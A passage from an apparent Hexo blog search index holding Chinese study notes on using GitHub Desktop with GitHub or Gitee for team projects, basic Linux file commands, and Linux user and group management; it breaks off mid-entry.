class="regexp">/etc/</span> -name \*.list </span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20231008234711794.png" alt="image-20231008234711794"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Github Desktop进行简单的团队合作开发</title>
      <link href="/posts/79105230.html"/>
      <url>/posts/79105230.html</url>
      
        <content type="html"><![CDATA[<h2 id="注册Git平台账号">注册Git平台账号</h2><ul><li>首先，创建一个云端的项目仓库。借助Github或者Gitee，可以将你的项目托管在云端，以便团队的各成员都能方便地拉取与提交自己的代码。你可以使用Github，也可以是Gitee，来完成你的云端项目部署。</li><li>如何选择？<ul><li>Github作为全球最大的开源平台，已有许多年的历史。作为老牌开元平台，有着许许多多优秀的代码仓库。但因为网络原因，国内会有无法访问的情况。</li><li>Gitee是由一家中国公司建立的，较新的开源平台，由于服务器设立在境内，因此无须担心网络问题。</li></ul></li></ul><div class="tabs" id="注册git平台账号"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#注册git平台账号-1">Github</button></li><li class="tab"><button type="button" data-href="#注册git平台账号-2">Gitee</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="注册git平台账号-1"><ul><li><p>如果你还没有注册过Github账号，那么需要先前往<a href="https://github.com/signup">Github注册页面</a>注册一个账号。</p></li><li><p>填入你的个人邮箱和密码</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923134102664.png" alt="image-20230923134102664"></p></li><li><p>按下<kbd>continue</kbd>进入下一步，填写你的用户名，如果提示<code>Username is not available.  </code>，说明这个用户名被占用了，那么你需要更换一个用户名。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923134511421.png" alt="image-20230923134511421"></p></li><li><p>再次按下<kbd>continue</kbd>进入下一步</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923134643032.png" alt="image-20230923134643032"></p><blockquote><p>您是否希望通过电子邮件接收产品更新和通知？<br>键入 &quot;y &quot;表示是，键入 &quot;n &quot;表示否</p></blockquote></li><li><p>按下<kbd>continue</kbd>，进入人机验证环节，只需要做<strong>几道十分简单</strong>的计算题。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923134933266.png" alt="image-20230923134933266"></p></li><li><p>点击<kbd>Create account</kbd>，进入邮箱验证环节，输入你的邮箱收到的来自Github发送的验证码。</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="注册git平台账号-2"><ul><li><p>首先进入<a href="https://gitee.com/signup">Gitee注册页面</a>，填写你的注册信息</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923145301278.png" alt="image-20230923145301278"></p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923145447312.png" alt="image-20230923145447312"></p></li><li><p>点击<kbd>立即注册</kbd>完成注册，然后跳转到开始页面。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923145611958.png" alt="image-20230923145611958"></p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="创建项目仓库">创建项目仓库</h2><p>团队协作中，只需要一个成员创建项目仓库即可，其他成员可以在仓库创建完成后加入合作。</p><div class="tabs" id="创建项目仓库"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#创建项目仓库-1">使用Github创建</button></li><li class="tab"><button type="button" data-href="#创建项目仓库-2">使用Gitee创建</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="创建项目仓库-1"><ul><li><p>注册完账户后，会自动跳转到<a href="https://github.com/join/get-started">开始页面</a>，选择<kbd>Create a repository</kbd>创建你的项目仓库</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923142743690.png" alt="image-20230923142743690"></p></li><li><p>填写项目信息，如果为私密仓库，填写项目名称与选择仓库类型即可，然后点击<kbd>Create repository</kbd>创建仓库。如果选择私密仓库，后面的连接到仓库步骤中则必须登录Github Desktop客户端。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923143955037.png" alt="image-20230923143955037"></p></li><li><p>完成创建后，就会自动跳转到你的仓库页面了。此时，你暂时无需操作任何内容，继续完成后续步骤即可，但不要关闭这个页面，之后的步骤还会用到。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923144222170.png" alt="image-20230923144222170"></p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="创建项目仓库-2"><ul><li><p>点击开始页面中的<kbd>创建我的仓库</kbd>按钮进入仓库创建页面</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923145747679.png" alt="image-20230923145747679"></p></li><li><p>填写仓库信息，点击<kbd>创建</kbd>完成仓库创建</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923145955632.png" alt="image-20230923145955632"></p></li><li><p>完成创建后，就会自动跳转到你的仓库页面了。此时，你暂时无需操作任何内容，继续完成后续步骤即可，但不要关闭这个页面，之后的步骤还会用到。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923150036301.png" alt="image-20230923150036301"></p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="下载Github-Desktop客户端">下载Github Desktop客户端</h2><ul><li><p>借助Github Desktop客户端，团队协作的完成可以无需使用任何Git命令，上手极为容易。</p></li><li><p>首先进入<a href="https://desktop.github.com/">Github Desktop官网</a>下载桌面客户端。</p><blockquote><p>阿里云盘下载：<a href="https://www.aliyundrive.com/s/2s84Cawtt8u">WIndows x64</a></p><p>百度网盘下载：<a href="https://pan.baidu.com/s/1xfTIb5Yw15zLBqTNF--Ypg?pwd=1234">Windows x64</a>  <a href="https://pan.baidu.com/s/1yv82gCEILLTwi8qh4RM8eA?pwd=1234">macOs</a></p><p>夸克网盘下载：<a href="https://pan.quark.cn/s/3d87b87a8738">Windows x64</a>  <a href="https://pan.quark.cn/s/b09b6f32dc84">macOs</a></p></blockquote><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923152058408.png" alt="image-20230923152058408"></p></li><li><p>启动安装程序</p></li></ul><div class="tabs" id="githubdesktop"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#githubdesktop-1">有Github账号</button></li><li class="tab"><button type="button" data-href="#githubdesktop-2">无Github账号</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="githubdesktop-1"><ul><li><p>点击<kbd>Sign in to Github.com</kbd>登录你的Github账户</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923153134.jpg" alt="img_20230923153134"></p></li><li><p>在网页中认证桌面端登录</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923153402.jpg" alt="img_20230923153402"></p></li><li><p>使用你的Github信息作为Git的提交信息（Use my GitHub account name and email address），然后点击<kbd>Finish</kbd></p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923153442.jpg" alt="img_20230923153442"></p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="githubdesktop-2"><ul><li><p>点击安装程序，选择下方的跳过登录（Skip this step）</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923160412584.png" alt="image-20230923160412584"></p></li><li><p>填写你的Git提交信息，这里设置的信息会作为你在Git仓库提交的联系方式，之后也可以进行修改</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923155542.png" alt="img_20230923155542"></p></li><li><p>点击<kbd>Finish</kbd>提交</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="连接到仓库">连接到仓库</h2><p>接下来，只需要将本地仓库连接到你的Git平台账户仓库即可，回到之前新建的的仓库页面。</p><div class="tabs" id="连接到仓库"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#连接到仓库-1">Github</button></li><li class="tab"><button type="button" data-href="#连接到仓库-2">Gitee</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="连接到仓库-1"><ul><li><p>复制仓库的git链接</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923162030088.png" alt="image-20230923162030088"></p></li><li><p>回到Github Desktop客户端，选择克隆一个仓库（Clone a repository)</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923162158.jpg" alt="img_20230923162158"></p></li><li><p>在弹出的窗口中填写刚才复制的链接，选择本地仓库保存的位置（空文件夹），点击<kbd>Clone</kbd>完成连接。如果出现连接错误，注意仓库是否为隐私仓库，如果为隐私仓库，则一定要在Github Desktop中登录你的Github账户。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923162524508.png" alt="image-20230923162524508"></p></li><li><p>在资源管理器中进入你的项目文件夹，现在可以将你的项目文件放到仓库文件夹中了。</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="连接到仓库-2"><ul><li><p>复制仓库的Git链接</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923164138920.png" alt="image-20230923164138920"></p></li><li><p>回到Github Desktop客户端，选择克隆一个仓库（Clone a repository)</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/img_20230923162158.jpg" alt="img_20230923162158"></p></li><li><p>在弹出的窗口中填写刚才复制的链接，选择本地仓库保存的位置（空文件夹），点击<kbd>Clone</kbd>完成连接。</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923164615076.png" alt="image-20230923164615076"></p></li><li><p>登录到Gitee，点击<kbd>Save and retry</kbd></p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923164733738.png" alt="image-20230923164733738"></p></li><li><p>在资源管理器中进入你的项目文件夹，现在可以将你的项目文件放到仓库文件夹中了。</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="提交本地项目">提交本地项目</h2><ul><li><p>如果本地仓库与托管库有内容差异，那么Github Desktop中会显示出所有有差异的项，现在只需要将这些修改项提交到托管库</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923165327854.png" alt="image-20230923165327854"></p></li><li><p>现在已经可以在Git库中看到刚才的提交了</p></li></ul><h2 id="邀请协作">邀请协作</h2><p>邀请别的成员进入项目，即可通过Git平台进行协作</p><div class="tabs" id="邀请协作"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#邀请协作-1">Github</button></li><li class="tab"><button type="button" data-href="#邀请协作-2">Gitee</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="邀请协作-1"><ul><li><p>在网页端的项目页中点击<kbd>Setting</kbd> -&gt; <kbd>Collaborate</kbd> -&gt; <kbd>Add people</kbd>，搜索其他成员的用户名、邮箱等信息</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923165745288.png" alt="image-20230923165745288"></p></li><li><p>选择账号，然后点击”Add to this repository&quot;完成添加成员</p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="邀请协作-2"><ul><li><p>在网页端的项目页中点击<kbd>管理</kbd> -&gt; <kbd>仓库成员管理</kbd> -&gt; <kbd>全部</kbd> -&gt; <kbd>添加仓库成员</kbd> -&gt; <kbd>邀请用户</kbd></p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923170308310.png" alt="image-20230923170308310"></p></li><li><p>点击<kbd>直接添加</kbd>，选择权限并搜索账户的用户名和邮箱，选择用户完成添加</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923170630827.png" alt="image-20230923170630827"></p></li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="从Git获取更新">从Git获取更新</h2><ul><li><p>当其他成员提交了代码后，你进行本地开发前，要从Git平台中拉取更新。打开Github Desktop客户端，点击“Fetch origin”拉取更新</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923171022885.png" alt="image-20230923171022885"></p></li><li><p>此时，本地的项目文件就已经被更新到最新了</p></li></ul><h2 id="内容冲突">内容冲突</h2><ul><li><p>当两个成员先后提交项目到托管库时，可能会出现代码冲突的情况，即两个人都改了同一行内容，这时，后提交的人则需要从代码库先拉取代码到本地，对于有冲突的内容，可以在Github Desktop客户端中手动解决冲突。完成本地的代码合并后，可以再次提交，此时可以提交成功。</p></li><li><p>尽管冲突处理可能并不容易，但尽请在完成一个新任务后尽快提交一次代码。如果一直未将本地的代码与托管库合并，就可能会造成更多的冲突哦。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux目录结构及文件基本操作</title>
      <link href="/posts/7c63bae8.html"/>
      <url>/posts/7c63bae8.html</url>
      
        <content type="html"><![CDATA[<h2 id="Linux目录结构">Linux目录结构</h2><ul><li>Windows系统中，存储是以盘符和分区为主，因此在经过一段时间的使用后，文件目录会相对混乱。</li><li>UNIX/Linux则是以目录为主，文件构成树形目录结构。</li></ul><h3 id="FHS标准">FHS标准</h3><ul><li>FHS（FileSystem Hierarchy Standard，文件系统层次结构标准）规定了Linux的部分目录结构，其定义了两层规范：<ul><li>第一层是 <code>/</code>，规定了各文件应该放置的位置，如 <code>/etc</code>应该放置设置文件，<code>/bin</code>应该放置可执行文件。</li><li>第二层则是针对 <code>/usr</code>及 <code>/var</code>两个目录的定义，例如 <code>/var/log</code>用于存放系统日志文件。<br><img src="https://doc.shiyanlou.com/linux_base/4-1.png" alt="FHS标准"></li></ul></li></ul><h3 id="目录路径">目录路径</h3><ul><li><p>在目录中进行切换可以使用 <code>cd</code>命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> &lt;<span class="built_in">path</span>&gt;/&lt;to&gt;/&lt;<span class="built_in">dir</span>&gt;</span><br><span class="line"><span class="built_in">cd</span> .. # 进入上一级目录</span><br><span class="line"><span class="built_in">cd</span> ~  # 进入当前用户home目录</span><br></pre></td></tr></table></figure></li><li><p>查看当前位置使用 <code>pwd</code></p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103108351.png" alt="image-20230923103108351"></p></li><li><p>如果路径以 <code>/</code>开头，则表示为绝对路径，路径则是从根目录开始查找。否则是相对路径，则是以当前目录作为起点进行查找。</p></li></ul><h2 id="Linux文件的基本操作">Linux文件的基本操作</h2><h3 id="新建文件">新建文件</h3><ul><li><p>使用 <code>touch</code>命令创建空白文件，如下，回到用户目录，然后创建 <code>test</code>文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">touch test</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103135750.png" alt="image-20230923103135750"></p></li></ul><h3 id="新建目录">新建目录</h3><ul><li><p>使用 <code>mkdir</code>创建一个空白目录，创建多级目录，可以使用 <code>-p</code>参数：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> mytest</span><br><span class="line"><span class="built_in">mkdir</span> -p father/son/grandson</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103203314.png" alt="image-20230923103203314"></p></li></ul><h3 id="复制">复制</h3><ul><li><p>使用 <code>cp</code>（copy）命令复制一个文件到指定目录下，将之前创建的 <code>test</code>文件复制到刚才创建的多级目录下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp test father/son/grandson</span><br><span class="line"><span class="built_in">cd</span> father/son/grandson</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103323402.png" alt="image-20230923103323402"></p></li></ul><h3 id="复制目录">复制目录</h3><ul><li><p>复制目录仍然使用的是 <code>cp</code>命令，但需要加上 <code>-r</code>或者 <code>-R</code>参数，表示递归复制，如下，将father目录移动到新建的 <code>family</code>目录下：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> family</span><br><span class="line">cp -r father family</span><br><span class="line"><span class="built_in">tree</span> family/</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103713970.png" alt="image-20230923103713970"></p></li></ul><h3 id="删除">删除</h3><ul><li><p>使用 <code>rm</code>（remove）命令删除文件或目录，删除 <code>test</code>文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm test</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923103742690.png" alt="image-20230923103742690"></p></li><li><p>如果需要删除一些为只读权限的文件，可以使用 <code>-f</code>参数强制删除，强制删除 <code>test</code>文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f test</span><br></pre></td></tr></table></figure></li><li><p>如果需要删除的是目录，则同样需要加上 <code>-r</code>或 <code>-R</code>参数，删除family目录：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -r family</span><br></pre></td></tr></table></figure></li></ul><h3 id="移动文件与文件重命名">移动文件与文件重命名</h3><ul><li><p>使用 <code>mv</code>（move）移动文件（剪切操作），将 <code>file1</code>移动到 <code>Documents</code>目录：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> Documents</span><br><span class="line">touch file1</span><br><span class="line">mv file1 Documents</span><br><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line"><span class="built_in">tree</span> Documents/</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104045186.png" alt="image-20230923104045186"></p></li><li><p>使用 <code>mv</code>同样可以对文件进行重命名，将文件 <code>file1</code>重命名为 <code>myfile</code>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Documents</span><br><span class="line">mv file1 myfile</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104134698.png" alt="image-20230923104134698"></p></li><li><p>如果需要重命名的文件太多，使用 <code>mv</code>则会非常麻烦，此时可以使用 <code>rename</code>进行批量重命名，其参数则使用perl正则表达式：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"># 批量创建<span class="number">5</span>个文件</span><br><span class="line">touch file&#123;<span class="number">1</span>..<span class="number">5</span>&#125;.txt</span><br><span class="line"># 批量修改后缀为.c</span><br><span class="line"><span class="built_in">rename</span> &#x27;s/\.txt/\.c/&#x27; *.txt</span><br><span class="line"># 将文件名称和后缀都改为大写</span><br><span class="line"><span class="built_in">rename</span> &#x27;y/a-z/A-Z/&#x27; *.c</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104411900.png" alt="image-20230923104411900"></p></li></ul><h3 id="查看文件">查看文件</h3><ul><li><p>使用 <code>cat</code>命令正序查看文件，使用 <code>tac</code>倒序查看文件，加上 <code>-n</code>参数则显示行号，使用 <code>cat</code>命令查看 <code>passwd</code>文件：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">cp /etc/passwd passwd</span><br><span class="line">cat -n passwd</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104503707.png" alt="image-20230923104503707"></p></li><li><p>使用 <code>nl</code>命令与 <code>cat -n</code>相同，都是添加行号并显示，<code>nl</code>命令包括如下参数：</p></li></ul><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">功能</th></tr></thead><tbody><tr><td style="text-align:center"><code>-b</code></td><td style="text-align:center">指定添加行号的方式</td></tr><tr><td style="text-align:center"><code>-b a</code></td><td style="text-align:center">无论是否为空行，都列出行号（<code>cat -n</code>）</td></tr><tr><td style="text-align:center"><code>-b t</code></td><td style="text-align:center">只列出非空行的编号并显示（默认）</td></tr><tr><td style="text-align:center"><code>-n</code></td><td style="text-align:center">设置行号的样式</td></tr><tr><td style="text-align:center"><code>-n ln</code></td><td style="text-align:center">在行号字段最左边显示</td></tr><tr><td style="text-align:center"><code>-n rn</code></td><td style="text-align:center">在行号字段最右边显示，不补0</td></tr><tr><td style="text-align:center"><code>-n rz</code></td><td style="text-align:center">在行号字段最右边显示，补0</td></tr><tr><td style="text-align:center"><code>-w</code></td><td style="text-align:center">行号字段占用的位数（默认6位）</td></tr></tbody></table><ul><li><p>使用 <code>more</code>和 <code>less</code>可以分页查看文件,打开文件后默认只显示一屏的内容，可以使用<kbd>Enter</kbd>向下滚动一行，使用<kbd>Space</kbd>向下滚动一屏，按下<kbd>h</kbd>显示帮助，按下<kbd>q</kbd>退出。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">more</span> passwd</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104701100.png" alt="image-20230923104701100"></p></li><li><p>使用 <code>head</code>或 <code>tail</code>命令查看文件前几行（默认10）或尾几行，使用 <code>-n</code>参数可以指定查看行数：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">head passwd</span><br><span class="line"># 查看最后一行内容</span><br><span class="line">tail -n <span class="number">1</span> passwd</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104730835.png" alt="image-20230923104730835"></p></li><li><p><code>tail</code>命令还有一个 <code>-f</code>参数，这个参数可以不断读取文件内容并显示，从而达到监控文件的作用</p></li></ul><h3 id="查看文件类型">查看文件类型</h3><ul><li><p>使用 <code>file</code>可以查看文件类型：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file /bin/ls</span><br></pre></td></tr></table></figure><blockquote><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923104951833.png" alt="image-20230923104951833"></p><p>说明这是一个可执行文件，运行在 64 位平台，并使用了动态链接文件（共享库）。</p></blockquote></li></ul><h3 id="编辑文件">编辑文件</h3><ul><li><p>可以使用编辑器编辑文件，比如使用vim编辑器：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim passwd</span><br></pre></td></tr></table></figure></li></ul><h2 id="实战训练">实战训练</h2><ol><li><p>创建一个 homework 目录，建立名为 1.txt～10.txt 文件，并删除 1.txt～5.txt 。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line"><span class="built_in">mkdir</span> homework</span><br><span class="line">touch &#123;<span class="number">1</span>..<span class="number">10</span>&#125;.txt</span><br><span class="line">rm &#123;<span class="number">1</span>..<span class="number">5</span>&#125;.txt</span><br></pre></td></tr></table></figure><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923105312850.png" alt="image-20230923105312850"></p></li><li><p>Linux 的日志文件在哪个目录？</p><p>日志文件存储在 <code>/var/log</code>目录下</p><p><img src="https://nightyping.oss-cn-guangzhou.aliyuncs.com/img/posts/image-20230923105427851.png" alt="image-20230923105427851"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux用户及文件权限管理</title>
      <link href="/posts/337bc2f3.html"/>
      <url>/posts/337bc2f3.html</url>
      
        <content type="html"><![CDATA[<h2 id="用户操作">用户操作</h2><h3 id="查看用户">查看用户</h3><p>输出当前使用终端的用户名</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937806007" alt="查看用户"></p><h3 id="创建用户">创建用户</h3><p>使用root用户登录，创建新用户。创建用户需要满足以下条件：</p><ul><li><p>知道当前用户的登录密码</p><blockquote><p>重置用户密码：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;sudo passwd &lt;username&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p>当前用户必须在sudo用户组</p></li></ul><ol><li>创建一个叫lilei的用户：</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo adduser lilei</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937837548" alt="创建用户"></p><ol start="2"><li>创建好用户后，讲用户添加到系统，并为用户创建<code>home</code>目录</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /home</span><br></pre></td></tr></table></figure><ol start="3"><li>切换到lilei用户，并查看当前用户名：</li></ol><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su -l lilei</span><br><span class="line">who am i</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937853403" alt="切换用户lilei"></p><h3 id="用户组">用户组</h3><h4 id="查看用户组">查看用户组</h4><h5 id="方法一">方法一</h5><p>使用<code>groups</code>命令查询用户组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groups shiyanlou</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937855752" alt="查看用户组"></p><h5 id="方法二">方法二</h5><p>通过<code>/etc/group</code>文件查看</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/group | <span class="built_in">sort</span></span><br><span class="line">cat /etc/group | grep -E &quot;shiyanlou&quot;</span><br></pre></td></tr></table></figure><p><img src="https://dn-simplecloud.shiyanlou.com/courses/uid1973843-20230917-1694937857521" alt="通过/etc/group查看用户组"></p><h4 id="加入用户组">加入用户组</h4><p>默认创建的用户不具有<code>sudo</code>权限，可以加入sudo用户组使其具有<code>sudo</code>权限。使用<code>usermod</code>命令添加权限：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su shiyanlou</span><br><span class="line">groups lilei</span><br><span class="line">sudo usermod -G sudo lilei</span><br><span class="line">groups lilei</span><br></pre></td></tr></table></figure><p><img 